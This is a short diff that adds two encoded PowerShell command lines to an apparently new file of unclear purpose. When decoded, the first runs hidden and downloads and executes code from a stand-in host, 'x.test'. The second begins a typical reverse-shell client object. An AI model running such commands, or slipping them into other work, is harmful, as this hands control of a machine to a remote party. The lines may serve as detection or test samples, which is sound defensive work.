@@ -1,0 +1,2 @@
+powershell -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwB4AC4AdABlAHMAdAApAA==
+pwsh.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
